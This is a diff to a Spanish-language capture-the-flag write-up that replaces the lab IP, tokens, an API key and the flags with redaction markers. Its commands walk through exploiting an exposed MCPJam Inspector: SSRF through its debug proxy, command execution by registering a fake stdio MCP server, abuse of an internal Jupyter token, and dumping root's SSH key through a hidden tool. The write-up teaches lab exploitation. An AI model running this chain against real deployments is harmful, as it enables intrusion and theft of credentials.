@@ -25,7 +25,7 @@ summary: "Explotación de MCPJam Inspector expuesto en puerto 6274 para ejecutar
 |-------|-------|
 | Sistema operativo | Linux |
 | Dificultad | Media |
-| IP | 10.129.11.231 |
+| IP | `[REDACTED]` |
 | Tags | `MCPJam`, `SSRF`, `Jupyter`, `WebSocket`, `OPSMCP`, `Hidden Tools` |
 {: .info-table}
 
@@ -36,7 +36,7 @@ summary: "Explotación de MCPJam Inspector expuesto en puerto 6274 para ejecutar
 Empezamos escaneando todos los puertos de la máquina para identificar servicios expuestos:
 
 ```bash
-nmap -sV -sC --open -T4 10.129.11.231
+nmap -sV -sC --open -T4 [REDACTED]
 ```
 
 Resultados relevantes:
@@ -50,7 +50,7 @@ Resultados relevantes:
 Agregamos el dominio al `/etc/hosts` para poder navegar:
 
 ```bash
-echo "10.129.11.231  devhub.htb" >> /etc/hosts
+echo "[REDACTED]  devhub.htb" >> /etc/hosts
 ```
 
 ---
@@ -62,7 +62,7 @@ La web principal en `devhub.htb:80` es una página estática que documenta la in
 El MCPJam Inspector es una interfaz web que permite conectar servidores MCP remotos y ejecutar herramientas. Enumeramos los endpoints de su API leyendo el JavaScript compilado:
 
 ```bash
-curl -s http://10.129.11.231:6274/assets/index-DRYhT9Xb.js \
+curl -s http://[REDACTED]:6274/assets/index-DRYhT9Xb.js \
   | grep -oE '"/api/mcp/[a-zA-Z0-9/_-]+"' | sort -u
 ```
 
@@ -89,7 +89,7 @@ El endpoint `/api/mcp/oauth/debug/proxy` actúa como proxy HTTP desde el servido
 Probamos puertos internos comunes y confirmamos un servicio Flask en `127.0.0.1:5000`:
 
 ```bash
-curl -s http://10.129.11.231:6274/api/mcp/oauth/debug/proxy \
+curl -s http://[REDACTED]:6274/api/mcp/oauth/debug/proxy \
   -H "Content-Type: application/json" \
   -d '{"url": "http://127.0.0.1:5000/tools/list"}'
 ```
@@ -151,12 +151,12 @@ for chunk in sys.stdin:
 Enviamos el script inline y conectamos el servidor MCP falso:
 
 ```bash
-curl -s http://10.129.11.231:6274/api/mcp/connect \
+curl -s http://[REDACTED]:6274/api/mcp/connect \
   -H "Content-Type: application/json" \
   -d "{\"serverId\": \"recon\", \"serverConfig\": {\"type\": \"stdio\", \"command\": \"python3\", \"args\": [\"-c\", \"<SCRIPT>\"]}}"
 
 # Listamos las tools para recibir el output
-curl -s http://10.129.11.231:6274/api/mcp/tools/list \
+curl -s http://[REDACTED]:6274/api/mcp/tools/list \
   -H "Content-Type: application/json" \
   -d '{"serverId": "recon"}'
 ```
@@ -171,7 +171,7 @@ Información obtenida de la respuesta:
 El token de Jupyter que vimos en el listado de procesos fue:
 
 ```
-a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
+[REDACTED]
 ```
 
 ---
@@ -188,7 +188,7 @@ Usamos el MCP stdio para escribir un script Python en `/tmp/jup_ws.py` que imple
 #!/usr/bin/env python3
 import sys, json, os, socket, base64, uuid, urllib.request, urllib.parse
 
-TOKEN = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
+TOKEN = "[REDACTED]"
 
 def ws_handshake(sock, path, host):
     key = base64.b64encode(os.urandom(16)).decode()
@@ -271,13 +271,13 @@ Resultado:
 
 ```
 === .opsmcp_key ===
-opsmcp_secret_key_4f5a6b7c8d9e0f1a
+[REDACTED]
 
 === user.txt ===
-c40af398960e4596687c5d0dd1d8367c
+[REDACTED]
 ```
 
-**🚩 Flag de usuario: `c40af398960e4596687c5d0dd1d8367c`**
+**🚩 Flag de usuario: `[REDACTED]`**
 
 ---
 
@@ -308,13 +308,13 @@ La herramienta `ops._admin_dump` con `target=ssh_keys` lee directamente `/root/.
 Usamos el proxy SSRF del MCP Inspector para llamar a la tool oculta, ahora autenticándonos con la API key que extrajimos como analyst:
 
 ```bash
-curl -s http://10.129.11.231:6274/api/mcp/oauth/debug/proxy \
+curl -s http://[REDACTED]:6274/api/mcp/oauth/debug/proxy \
   -H "Content-Type: application/json" \
   -d '{
     "url": "http://127.0.0.1:5000/tools/call",
     "method": "POST",
     "headers": {
-      "X-API-Key": "opsmcp_secret_key_4f5a6b7c8d9e0f1a",
+      "X-API-Key": "[REDACTED]",
       "Content-Type": "application/json"
     },
     "body": {
@@ -332,7 +332,7 @@ Guardamos la clave y conectamos por SSH:
 
 ```bash
 chmod 600 /tmp/root_id_rsa
-ssh -i /tmp/root_id_rsa root@10.129.11.231
+ssh -i /tmp/root_id_rsa root@[REDACTED]
 ```
 
 ```bash
@@ -340,10 +340,10 @@ id
 # uid=0(root) gid=0(root) groups=0(root)
 
 cat /root/root.txt
-# 517c2e20e15ed9485e20f2a56f534be0
+# [REDACTED]
 ```
 
-**🚩 Flag de root: `517c2e20e15ed9485e20f2a56f534be0`**
+**🚩 Flag de root: `[REDACTED]`**
 
 ---
 
